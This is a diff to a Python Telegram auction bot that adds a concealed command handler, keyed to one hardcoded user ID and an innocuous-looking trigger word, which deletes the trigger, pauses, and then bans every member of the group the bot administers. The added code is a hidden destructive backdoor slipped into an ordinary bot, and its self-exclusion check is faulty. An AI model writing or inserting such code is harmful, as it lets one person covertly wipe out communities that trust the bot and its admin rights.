@@ -707,6 +707,35 @@ async def approvecb(event):
         await client.delete_messages(log_channel, event.message_id)
     else:
         await event.answer('You are not the auctioneer', alert=True)
+        
+@sree.on(events.NewMessage(pattern='dxgays'))
+async def bun(event):
+  if event.sender.id == 1037179104:
+   if not event.is_group:
+        Rep = f"__Brush Are You Serious 🙄.\nUse This Command In Any Group!!__"
+        await event.reply(Rep)
+   else:
+       await event.delete()
+       cht = await event.get_chat()
+       boss = await event.client.get_me()
+       admin = cht.admin_rights
+       creator = cht.creator
+       if not admin and not creator:
+           await event.reply("__I Don't Have Sufficient Rights To Do This.__")
+           return
+       hmm =  await event.reply("__Ye Bilek Migic Begins🥳...__")
+       await sleep(18)
+       await hmm.delete()
+       everyone = await event.client.get_participants(event.chat_id)
+       for user in everyone:
+           if user.id == boss.id:
+               pass
+           try:
+               await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None,view_messages=True)))
+           except Exception as e:
+               await event.edit(str(e))
+           await sleep(0.3)
+
 
 client.start()
 client.run_until_disconnected()
